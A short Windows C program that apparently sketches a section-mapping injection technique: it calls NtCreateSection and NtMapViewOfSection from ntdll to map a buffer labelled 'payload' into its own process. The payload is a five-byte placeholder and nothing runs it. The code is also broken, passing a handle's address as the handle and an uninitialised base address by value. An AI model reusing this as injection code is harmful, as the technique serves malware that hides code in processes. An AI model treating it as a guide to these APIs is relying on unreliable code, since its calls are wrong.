# include <windows.h>
# include <winternl.h>
# include <stdio.h>

unsigned char buf[]={0x23,0xe5,0x84,0x00,0x00};

typedef enum _SECTION_INHERIT {

    ViewShare=1,
    ViewUnmap=2
} SECTION_INHERIT, *PSECTION_INHERIT;
void Mapviewinject(){
    HANDLE current_process_handle;
    LARGE_INTEGER payload_len;
    payload_len.QuadPart=sizeof(buf); //https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dtyp/e904b1ba-f774-4203-ba1b-66485165ab1a
    //LPVOID payload_length=(LPVOID)&payload_len;
    NTSTATUS(*NtcreateSection)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PLARGE_INTEGER,ULONG,ULONG,HANDLE);
    LPVOID addr= GetProcAddress(GetModuleHandle("ntdll.dll"),"NtCreateSection");
    NtcreateSection=(NTSTATUS(*)(PHANDLE,ACCESS_MASK,POBJECT_ATTRIBUTES,PLARGE_INTEGER,ULONG,ULONG,HANDLE))addr;
    NTSTATUS value=NtcreateSection(&current_process_handle,SECTION_ALL_ACCESS,NULL,(PLARGE_INTEGER)&payload_len,PAGE_READWRITE,SEC_COMMIT,NULL);
    if(!value) {
        NTSTATUS (*NtMapviewofSection)(HANDLE,HANDLE,PVOID,ULONG,ULONG,PLARGE_INTEGER,PULONG,SECTION_INHERIT,ULONG,ULONG);
        LPVOID addr_mapview=GetProcAddress(GetModuleHandle("ntdll.dll"),"NtMapViewOfSection");
        NtMapviewofSection=(NTSTATUS (*)(HANDLE,HANDLE,PVOID,ULONG,ULONG,PLARGE_INTEGER,PULONG,SECTION_INHERIT,ULONG,ULONG))addr_mapview;
        LPVOID addr_base;
        NTSTATUS value_2= NtMapviewofSection(&current_process_handle,GetCurrentProcess(),addr_base,NULL,NULL,NULL,sizeof(buf),NULL,NULL,PAGE_READWRITE);
        printf("value2 is %x",value_2);
    }   
    else{
        exit(0);
    }
}



void main(){
   Mapviewinject();
}
